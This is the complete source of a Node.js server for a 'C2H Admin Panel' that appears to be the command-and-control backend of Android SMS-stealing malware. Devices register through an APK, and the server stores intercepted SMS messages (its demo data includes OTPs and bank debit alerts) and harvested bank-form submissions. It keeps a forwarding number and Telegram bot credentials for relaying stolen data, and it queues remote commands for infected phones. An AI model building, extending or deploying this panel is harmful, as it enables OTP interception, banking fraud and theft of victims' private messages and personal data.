const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();

const app = express();

// Middleware - CORS FIXED
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: true
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Database setup
const db = new sqlite3.Database(':memory:', (err) => {
    if (err) {
        console.error('❌ Database error:', err.message);
    } else {
        console.log('✅ Connected to SQLite database');
        initDB();
    }
});

// Initialize database with DEMO DEVICE
function initDB() {
    console.log('🔄 Initializing database tables...');
    
    const tables = [
        `CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            device_name TEXT DEFAULT 'Unknown Device',
            os_version TEXT DEFAULT 'Unknown',
            phone_number TEXT DEFAULT 'Unknown',
            battery_level INTEGER DEFAULT 0,
            last_seen DATETIME NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`,
        
        `CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            command_type TEXT NOT NULL,
            command_data TEXT NOT NULL,
            status TEXT DEFAULT 'pending',
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`,
        
        `CREATE TABLE IF NOT EXISTS sms_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            sender TEXT NOT NULL,
            message_body TEXT NOT NULL,
            received_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`,
        
        `CREATE TABLE IF NOT EXISTS form_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            custom_data TEXT NOT NULL,
            submitted_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`,
        
        `CREATE TABLE IF NOT EXISTS global_settings (
            setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
            setting_value TEXT
        )`
    ];
    
    db.serialize(() => {
        // Create tables
        tables.forEach((sql, index) => {
            db.run(sql, (err) => {
                if (err) {
                    console.error(`❌ Table ${index + 1} error:`, err.message);
                }
            });
        });
        
        // Add DEMO DEVICE automatically
        const demoDevice = {
            device_id: 'DEMO-DEVICE-001',
            device_name: 'Samsung Galaxy S23',
            os_version: 'Android 14',
            phone_number: '+919876543210',
            battery_level: 78,
            last_seen: new Date().toISOString()
        };
        
        db.run(
            `INSERT OR IGNORE INTO devices 
            (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) 
            VALUES (?, ?, ?, ?, ?, ?, ?)`,
            [
                demoDevice.device_id,
                demoDevice.device_name,
                demoDevice.os_version,
                demoDevice.phone_number,
                demoDevice.battery_level,
                demoDevice.last_seen,
                demoDevice.last_seen
            ],
            (err) => {
                if (err) {
                    console.error('❌ Demo device insertion error:', err.message);
                } else {
                    console.log('✅ Demo device added: DEMO-DEVICE-001');
                }
            }
        );
        
        // Add sample SMS logs for demo device
        const sampleSMS = [
            {
                sender: '+919999999999',
                message_body: 'Your OTP is 123456. Valid for 10 minutes.'
            },
            {
                sender: 'BANK-ALERT',
                message_body: '₹5,000 debited from A/C XX1234. Avl Bal: ₹45,200'
            },
            {
                sender: 'AMAZON',
                message_body: 'Your order #ORD12345 has been shipped. Track here: https://amzn.in/track'
            }
        ];
        
        sampleSMS.forEach((sms, index) => {
            db.run(
                `INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)`,
                ['DEMO-DEVICE-001', sms.sender, sms.message_body],
                (err) => {
                    if (err) console.error(`❌ Sample SMS ${index + 1} error:`, err.message);
                }
            );
        });
        
        // Add sample form submission
        db.run(
            `INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)`,
            [
                'DEMO-DEVICE-001',
                '📝 *Form Submission*\n\n' +
                '📍 Location: Mumbai, India\n' +
                '📧 Email: user@example.com\n' +
                '📱 Phone: +919876543210\n' +
                '📄 Form Type: Bank Application\n' +
                '🕐 Time: ' + new Date().toLocaleString()
            ],
            (err) => {
                if (err) console.error('❌ Sample form error:', err.message);
                else console.log('✅ Sample form data added');
            }
        );
        
        console.log('🎉 Database initialized with demo data');
    });
}

// Helper functions
function dbGet(query, params = []) {
    return new Promise((resolve, reject) => {
        db.get(query, params, (err, row) => {
            if (err) reject(err);
            else resolve(row);
        });
    });
}

function dbAll(query, params = []) {
    return new Promise((resolve, reject) => {
        db.all(query, params, (err, rows) => {
            if (err) reject(err);
            else resolve(rows);
        });
    });
}

function dbRun(query, params = []) {
    return new Promise((resolve, reject) => {
        db.run(query, params, function(err) {
            if (err) reject(err);
            else resolve({ lastID: this.lastID, changes: this.changes });
        });
    });
}

// =========== API ENDPOINTS ===========

// 1. Health Check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        message: 'C2H Panel API is running',
        timestamp: new Date().toISOString(),
        version: '2.0.0',
        features: ['device-registration', 'sms-forwarding', 'telegram', 'commands', 'demo-data']
    });
});

// 2. Test Endpoint - ALWAYS WORKING
app.get('/api/test', (req, res) => {
    res.json({ 
        status: 'success', 
        message: 'Test endpoint working!',
        server: 'Vercel Node.js',
        time: new Date().toISOString()
    });
});

// 3. Device Registration - ULTRA SIMPLE VERSION
app.post('/api/device/register', async (req, res) => {
    console.log('📱 Device registration attempt:', req.body);
    
    try {
        const { device_id } = req.body;
        
        if (!device_id) {
            console.log('❌ Missing device_id');
            return res.status(400).json({ 
                status: 'error', 
                message: 'device_id is required' 
            });
        }
        
        const last_seen = new Date().toISOString();
        
        // Always update or insert
        await dbRun(
            `INSERT OR REPLACE INTO devices 
            (device_id, device_name, os_version, phone_number, battery_level, last_seen) 
            VALUES (?, ?, ?, ?, ?, ?)`,
            [
                device_id,
                req.body.device_name || 'Android Device',
                req.body.os_version || 'Android',
                req.body.phone_number || '+910000000000',
                req.body.battery_level || 50,
                last_seen
            ]
        );
        
        console.log(`✅ Device registered/updated: ${device_id}`);
        
        // SUCCESS RESPONSE - EXACTLY AS APK EXPECTS
        res.json({ 
            status: 'success', 
            message: 'Device data received and updated.' 
        });
        
    } catch (error) {
        console.error('❌ Registration error:', error.message);
        res.status(500).json({ 
            status: 'error', 
            message: 'Internal server error',
            details: error.message 
        });
    }
});

// 4. Get Devices - WITH DEMO DEVICE
app.get('/api/devices', async (req, res) => {
    console.log('📋 Fetching devices list');
    
    try {
        const rows = await dbAll('SELECT * FROM devices ORDER BY created_at ASC');
        const currentTime = new Date();
        
        console.log(`📊 Found ${rows.length} devices`);
        
        const devices = rows.map(device => {
            const lastSeen = new Date(device.last_seen);
            const timeDiff = (currentTime - lastSeen) / 1000;
            const is_online = timeDiff < 30; // 30 seconds threshold

            return {
                device_id: device.device_id,
                device_name: device.device_name,
                os_version: device.os_version,
                phone_number: device.phone_number,
                battery_level: device.battery_level,
                is_online: is_online,
                created_at: device.created_at,
                last_seen: device.last_seen
            };
        });

        res.json(devices);
    } catch (error) {
        console.error('❌ Error loading devices:', error);
        res.status(500).json({ 
            status: 'error', 
            message: 'Failed to load devices',
            error: error.message 
        });
    }
});

// 5. Get Device by ID
app.get('/api/device/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const device = await dbGet('SELECT * FROM devices WHERE device_id = ?', [deviceId]);
        
        if (device) {
            const currentTime = new Date();
            const lastSeen = new Date(device.last_seen);
            const timeDiff = (currentTime - lastSeen) / 1000;
            const is_online = timeDiff < 30;
            
            res.json({
                device_id: device.device_id,
                device_name: device.device_name,
                os_version: device.os_version,
                phone_number: device.phone_number,
                battery_level: device.battery_level,
                is_online: is_online,
                created_at: device.created_at
            });
        } else {
            res.status(404).json({ 
                status: 'error', 
                message: 'Device not found' 
            });
        }
    } catch (error) {
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

// 6. Update SMS Forward
app.post('/api/config/sms_forward', async (req, res) => {
    try {
        const { forward_number } = req.body;
        console.log(`📞 Updating SMS forward number: ${forward_number}`);
        
        await dbRun(
            `INSERT OR REPLACE INTO global_settings (setting_key, setting_value) 
            VALUES ('sms_forward_number', ?)`,
            [forward_number]
        );
        res.json({ 
            status: 'success', 
            message: 'Forwarding number updated successfully.' 
        });
    } catch (error) {
        console.error('❌ Error updating SMS forward:', error);
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

// 7. Get SMS Forward
app.get('/api/config/sms_forward', async (req, res) => {
    try {
        const row = await dbGet(
            'SELECT setting_value FROM global_settings WHERE setting_key = ?',
            ['sms_forward_number']
        );
        res.json({ 
            forward_number: row ? row.setting_value : null 
        });
    } catch (error) {
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

// 8. Telegram Config
app.post('/api/config/telegram', async (req, res) => {
    try {
        const { telegram_bot_token, telegram_chat_id } = req.body;
        console.log('🤖 Updating Telegram config');
        
        await dbRun(
            `INSERT OR REPLACE INTO global_settings (setting_key, setting_value) 
            VALUES ('telegram_bot_token', ?)`,
            [telegram_bot_token]
        );
        await dbRun(
            `INSERT OR REPLACE INTO global_settings (setting_key, setting_value) 
            VALUES ('telegram_chat_id', ?)`,
            [telegram_chat_id]
        );
        res.json({ 
            status: 'success', 
            message: 'Telegram details updated successfully.' 
        });
    } catch (error) {
        console.error('❌ Error updating Telegram config:', error);
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

app.get('/api/config/telegram', async (req, res) => {
    try {
        const rows = await dbAll(
            `SELECT * FROM global_settings 
            WHERE setting_key IN ('telegram_bot_token', 'telegram_chat_id')`
        );
        
        const result = {};
        rows.forEach(row => {
            result[row.setting_key] = row.setting_value;
        });
        
        res.json({
            telegram_bot_token: result.telegram_bot_token || null,
            telegram_chat_id: result.telegram_chat_id || null
        });
    } catch (error) {
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

// 9. Send Command
app.post('/api/command/send', async (req, res) => {
    try {
        const { device_id, command_type, command_data } = req.body;
        console.log(`📨 Sending command: ${command_type} to ${device_id}`);
        
        await dbRun(
            `INSERT INTO commands (device_id, command_type, command_data, status) 
            VALUES (?, ?, ?, 'pending')`,
            [device_id, command_type, JSON.stringify(command_data || {})]
        );
        
        res.json({ 
            status: 'success', 
            message: 'Command queued successfully.' 
        });
    } catch (error) {
        console.error('❌ Error sending command:', error);
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

// 10. Get Commands for Device
app.get('/api/device/:deviceId/commands', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const rows = await dbAll(
            `SELECT * FROM commands WHERE device_id = ? AND status = 'pending'`,
            [deviceId]
        );

        // Mark as sent
        if (rows.length > 0) {
            const commandIds = rows.map(r => r.id);
            const placeholders = commandIds.map(() => '?').join(',');
            await dbRun(
                `UPDATE commands SET status = 'sent' WHERE id IN (${placeholders})`,
                commandIds
            );
        }

        const commands = rows.map(cmd => ({
            id: cmd.id,
            command_type: cmd.command_type,
            command_data: cmd.command_data ? JSON.parse(cmd.command_data) : {}
        }));

        res.json(commands);
    } catch (error) {
        console.error('❌ Error getting commands:', error);
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

// 11. Execute Command
app.post('/api/command/:commandId/execute', async (req, res) => {
    try {
        const { commandId } = req.params;
        await dbRun(`UPDATE commands SET status = 'executed' WHERE id = ?`, [commandId]);
        res.json({ 
            status: 'success', 
            message: 'Command marked as executed.' 
        });
    } catch (error) {
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

// 12. SMS Logs
app.post('/api/device/:deviceId/sms', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { sender, message_body } = req.body;
        console.log(`📱 SMS from ${sender} to ${deviceId}`);
        
        await dbRun(
            'INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)',
            [deviceId, sender, message_body]
        );
        res.json({ 
            status: 'success', 
            message: 'SMS logged.' 
        });
    } catch (error) {
        console.error('❌ Error logging SMS:', error);
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

app.get('/api/device/:deviceId/sms', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const rows = await dbAll(
            'SELECT * FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC',
            [deviceId]
        );
        res.json(rows);
    } catch (error) {
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

// 13. Forms
app.post('/api/device/:deviceId/forms', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { custom_data } = req.body;
        console.log(`📄 Form submission from ${deviceId}`);
        
        await dbRun(
            'INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)',
            [deviceId, custom_data]
        );
        res.json({ 
            status: 'success', 
            message: 'Form data saved.' 
        });
    } catch (error) {
        console.error('❌ Error saving form:', error);
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

app.get('/api/device/:deviceId/forms', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const rows = await dbAll(
            'SELECT * FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC',
            [deviceId]
        );
        res.json(rows);
    } catch (error) {
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

// 14. DELETE Endpoints
app.delete('/api/device/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;
        console.log(`🗑️ Deleting device: ${deviceId}`);
        
        await dbRun('DELETE FROM devices WHERE device_id = ?', [deviceId]);
        await dbRun('DELETE FROM sms_logs WHERE device_id = ?', [deviceId]);
        await dbRun('DELETE FROM form_submissions WHERE device_id = ?', [deviceId]);
        res.json({ 
            status: 'success', 
            message: 'Device and related data deleted.' 
        });
    } catch (error) {
        console.error('❌ Error deleting device:', error);
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

app.delete('/api/sms/:smsId', async (req, res) => {
    try {
        const { smsId } = req.params;
        await dbRun('DELETE FROM sms_logs WHERE id = ?', [smsId]);
        res.json({ 
            status: 'success', 
            message: 'SMS deleted.' 
        });
    } catch (error) {
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

// 15. Get Stats
app.get('/api/stats', async (req, res) => {
    try {
        const [deviceCount, smsCount, formCount, commandCount] = await Promise.all([
            dbGet('SELECT COUNT(*) as count FROM devices'),
            dbGet('SELECT COUNT(*) as count FROM sms_logs'),
            dbGet('SELECT COUNT(*) as count FROM form_submissions'),
            dbGet('SELECT COUNT(*) as count FROM commands')
        ]);
        
        res.json({
            devices: deviceCount.count,
            sms_logs: smsCount.count,
            form_submissions: formCount.count,
            commands: commandCount.count,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

// 16. Demo Data Endpoint
app.get('/api/demo/reset', async (req, res) => {
    try {
        // Reset and add demo data
        await dbRun('DELETE FROM devices');
        await dbRun('DELETE FROM sms_logs');
        await dbRun('DELETE FROM form_submissions');
        
        // Add demo device again
        const demoDevice = {
            device_id: 'DEMO-DEVICE-001',
            device_name: 'Samsung Galaxy S23',
            os_version: 'Android 14',
            phone_number: '+919876543210',
            battery_level: 78,
            last_seen: new Date().toISOString()
        };
        
        await dbRun(
            `INSERT INTO devices 
            (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) 
            VALUES (?, ?, ?, ?, ?, ?, ?)`,
            [
                demoDevice.device_id,
                demoDevice.device_name,
                demoDevice.os_version,
                demoDevice.phone_number,
                demoDevice.battery_level,
                demoDevice.last_seen,
                demoDevice.last_seen
            ]
        );
        
        res.json({ 
            status: 'success', 
            message: 'Demo data reset successfully' 
        });
    } catch (error) {
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
});

// 17. Root endpoint
app.get('/', (req, res) => {
    res.json({
        message: 'C2H Admin Panel API',
        version: '2.0.0',
        endpoints: {
            health: '/api/health',
            test: '/api/test',
            register: 'POST /api/device/register',
            devices: 'GET /api/devices',
            stats: '/api/stats',
            demo: '/api/demo/reset'
        },
        status: 'running',
        timestamp: new Date().toISOString()
    });
});

// For Vercel
module.exports = app;

// For local testing
if (require.main === module) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`🌐 Health: http://localhost:${PORT}/api/health`);
        console.log(`📱 Test: http://localhost:${PORT}/api/test`);
        console.log(`📊 Devices: http://localhost:${PORT}/api/devices`);
        console.log(`🎯 Demo device: DEMO-DEVICE-001`);
    });
}
